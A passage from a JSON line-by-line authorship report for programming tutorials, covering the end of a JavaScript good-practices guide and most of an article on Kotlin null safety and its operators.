        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "    var headerColor \u003d optionals.headerColor || \u0027default\u0027;"
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "    var bodyColor \u003d optionals.bodyColor || \u0027default\u0027;"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "// es6 syntax with destructuring and default parameters"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "openorclose"
        },
        "content": "function createPopUp(title, content, status, { headerColor \u003d \u0027default\u0027, bodyColor \u003d \u0027default\u0027 }) {"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "By using an object, the user would just need to fill in what parameter they want to be changed. In large functions, this would result in better readability as well."
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "createPopUp(\u0027Warning\u0027, \u0027This will delete everything!\u0027, dangerStatus, { bodyColor: \u0027red\u0027 });"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Understand Method Chaining"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Method chaining is syntax such as `array.concat([1, 2]).filter(isEven)`. It is also sometimes referred to as the fluent interface. (see: [Method Chaining in JavaScript]())"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "It is achieved by returning the object itself in the call."
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "var obj \u003d {"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "    save: function() {"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "        // some procedures"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "        return this;"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "};"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "Method chaining can be found in other languages but it is very common in Javascript. It can be found in libraries such as JQuery and lodash. Compare the two snippets below:"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "var bob \u003d new Person();"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "bob.setName(\u0027Bob\u0027);"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "bob.setAge(16);"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "bob.setGender(\u0027male\u0027);"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "bob.save();"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "new Person()"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "  .setName(\u0027Bob\u0027)"
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "  .setAge(16)"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": "  .setGender(\u0027male\u0027)"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "  .save();"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "Not only is the method chaining much shorter, it also makes the code more maintainable by keeping properties organised nicely and easily traceable in version control."
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "However, like any design pattern, this is not to be abused. Only use method chaining when methods are related to the object at hand."
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": "### Addendum"
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "As with all guides, this list of good practices and advices are not exhausive. Good code takes practice and finese, and if you discover ways to make code better, feel free to contribute and add them to this document! "
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "[Clean Code Javascript](https://github.com/ryanmcdermott/clean-code-javascript)"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "Apparently most of what I wrote appears in this huge guide in some form. It\u0027s an amazing resource and also explains SOLID clearly near the bottom."
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": "[Airbnb Javascript Style](https://github.com/airbnb/javascript)"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "It is one thing to follow the style guide, and another to understand why it is that way. Understanding why Airbnb chose certain constructs and syntax reveals ways to write code that is clean, understandable and maintainable."
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "[JavaScript Design Patterns](https://addyosmani.com/resources/essentialjsdesignpatterns/book/)"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": "The title says it all. From the most common to obscure patterns, this book covers design patterns and explains trade offs. Although it specifically caters to Javascript, it\u0027s recommended reading for all prospective software engineers."
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": "## References"
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "[Namespacing in Javascript](https://javascriptweblog.wordpress.com/2010/12/07/namespacing-in-javascript/)"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": "[Method Chaining in JavaScript](https://schier.co/blog/2013/11/14/method-chaining-in-javascript.html)"
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "openorclose": 28,
      "Tejas2805": 8,
      "-": 239
    }
  },
  {
    "path": "contents/kotlin/NullSafety.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Null Safety in Kotlin"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Null Safety in Kotlin"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Pan Haozhe](https://github.com/Haozhe321)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "* [What is Null Safety?‎](#what-is-null-safety)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "    * [NullPointerException‎](#nullpointerexception)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "* [How does Kotlin handle Null Safety?‎](#how-does-kotlin-handle-null-safety)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Nullable and Non-nullable type‎](#nullable-and-non-nullable-type)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Safety Operators in Kotlin‎](#safety-operators-in-kotlin)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "        * [Safe call operator‎](#safe-call-operator)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "        * [Elvis Operators‎](#elvis-operators)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "        * [Not-null assertion operator‎](#not-null-assertion-operator)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "* [Summary‎](#summary)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "* [Learning resources‎](#learning-resources)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e“I call it my billion-dollar mistake. It was the invention of the null reference…My goal was to ensure that all use of references should be absolutely safe, with **checking performed automatically by the compiler**. But I couldn\u0027t resist the temptation to put in a null reference, simply because it was so easy to implement.”  "
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "-Tony Hoare"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "This document explains Kotlin\u0027s null safety feature. For an overview of Kotlin, see [here](kotlin.html)."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "# What is Null Safety?"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "_Null Safety_ (or _void safety_) is the guarantee that no object reference will have a `null` value."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "In object-oriented languages, access to objects is achieved through references. A typical function call is of the form `object.func()`; `object` denotes a reference to a certain object, and `func` denotes a function call. At execution time, the reference to `object` can be `void`, leading to run-time exceptions (In the case of Java, a NullPointerException) and often abnormal termination of the program."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "## NullPointerException"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": " When developing Android applications in Java, [NullPointerException (NPE)](https://docs.oracle.com/javase/9/docs/api/java/lang/NullPointerException.html) was a big problem. In fact, About [one third of app crashes can be attributed to NPE](https://image.slidesharecdn.com/droidcon-bugsense-130408170720-phpapp01/95/droid-con-bugsense-16-638.jpg?cb\u003d1365440918). To see how it happens, let\u0027s take a look at the piece of Java code below:"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "String a \u003d null;"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "if(a.length \u003e 5) {"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "    //do something"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "When the above code is run, an NPE will be thrown on line 2 because a `null` object has no methods. To prevent an object from taking on a `null` value, programmers typically resort to doing additional checks like this:"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "String a \u003d null;"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "if(a !\u003d null \u0026\u0026 a.length \u003e 5) {"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "        //do something"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "And of course, that\u0027s all fine, until we want to do something more complex. Say Bob belongs to a department, and we want to get the name of the department manager. That will look like this:"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "String managerName \u003d bob.department.manager.name;"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "Because each variable can be `null`, to prevent the NPE we put the code in the following code block:"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "if(bob !\u003d null) {"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "    Department department \u003d bob.department;"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "    if(department !\u003d null) {"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "        Employee manager \u003d department.manager;"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "        if(manager !\u003d null) {"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "            String name \u003d manager.name;"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "            if(name !\u003d null) {"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "                //do something"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "            }"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "The deep-nested `if` statement reduces readability of our code."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "The other way is to use [Java Optionals](https://www.oracle.com/technetwork/articles/java/java8-optional-2175753.html)."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "For the first example above, we can do"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "a.ifPresent(this::doSomething);"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "And for the deeply-nested `if` statements, the verbosity can be reduced with"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "``` java"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "bob.map(Person::getDepartment)"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "    .map(Person::getManager)"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "    .map(Person::getName)"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "    .ifPresent(Person::doSomething);"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "`map()` is a method in Java Optionals class that applies the function inside the parentheses to the object that is calling it. If the object is not present, it will return an empty Optional.  "
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s see how Kotlin deals with this issue while maintaining a simple and readable syntax."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# How Does Kotlin Handle Null Safety?"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Nullable and Non-Nullable Type"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "In Kotlin, a type can be _nullable_ or _non-nullable_, determined by the presence of a `?`. For example, an object of type `String` is non-nullable, while an object of type `String?` is nullable.  "
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "As the compiler catches `null` assignments to non-nullable objects, the following would result in compilation error."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "```Kotlin"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "var firstString: String \u003d \"hello world\""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "firstString \u003d null //compilation error"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "In comparison, the following assignment to a nullable type is allowed"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "```Kotlin"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "var secondString: String? \u003d \"hello world\""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "secondString \u003d null //okay"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "In the first case, we can safely call `firstString.length` without having to worry about a NPE because `firstString` can never be `null`.   "
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "In the second case, `secondString` can potentially be `null`, so `secondString.length` will result in a compilation error as the compiler see the danger of such statement and blocks it early."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "## Safety Operators in Kotlin"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "Although non-nullable type is a strong feature in Kotlin, the [interoperability](https://kotlinlang.org/docs/reference/java-interop.html) with Java means that we have to use variables as nullable type sometimes. In the previous section, we seem to have hit an obstacle as the compiler blocks the call to `secondString.length`. In this section we look at some ways of overcoming this problem."
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Safe Call Operator"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "Represented by `?.`, the safe call operator is used in this way  "
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "```kotlin"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "secondString?.length"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "This returns the length of `secondString` if `secondString` is not `null`, and `null` otherwise."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "Now we can chain like this"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "```Kotlin"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "bob?.department?.manager?.name"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "This chain will return `null` if any of the variables inside the chain is `null`."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "### Elvis Operators"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "Represented by `?:`, the Elvis operator is used in this way"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "```kotlin"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "val length \u003d secondString?.length ?: -1"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "If the expression to the left of `?:` is not null, the Elvis operator (`?.`) will return it as it is; else it will return a default value supplied (-1 in this case)."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "We also notice the use of safe call operator together with Elvis operator in the same statement."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "But the Elvis operator is more powerful than this. `return` and `throw` statements are legitimate default values on the right side of the Elvis operator. So you can define your own error message to aid debugging. For example:"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "```kotlin"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "fun myFunc(node: Node): String? {"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "    val parent \u003d node.getParent() ?: return null"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "    val name \u003d node.getName() ?: throw IllegalArgumentException(\"Name expected\")"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "    // ..."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "Doing so like this can help programmers to check for function arguments before carrying on with the required computation."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "At this point you may ask, \"What if I still want my NPE?\""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Not-Null Assertion Operator"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "Represented by `!!`, the not-null assertion operator is used in this way"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "```kotlin"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "val stringLength \u003d secondString!!.length"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "The operator converts any value to a non-nullable type and throws an exception if the value is null. In the above example, `stringLength` will be assigned the length of `secondString` if `secondString` is not `null`; if secondString is `null`, a NPE is thrown. Kotlin tries to reduce the number of NPEs thrown as it is a run-time exception that is difficult to debug, in addition to creating so many app crashes. Hence NPEs in Kotlin are explicitly asked for."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "# Summary"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "1. Kotlin increases null safety of programs because some of the work required to ensure null safety is offloaded from the programmer to the compiler, which is less error prone."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "2. Null Safety is enforced by the Kotlin language. This is better compared to Java Optionals which is a Class and not a language construct like Kotlin\u0027s null-safety system."
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "3. If you expect your object to **not** take on a `null` value, make it a non-nullable type!"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "4. Even if you make your object a nullable type, Kotlin handles it better than Java because it can help to prevent NPE. An generic NPE is hard to debug; in Kotlin a descriptive message could be given to make debugging easier (with the help of Elvis operator)."
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Learning Resources"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "* [Null Safety in Kotlin](https://kotlinlang.org/docs/reference/null-safety.html)"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Comprehensive Guide to Null Safety in Kotlin](https://www.baeldung.com/kotlin-null-safety)"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
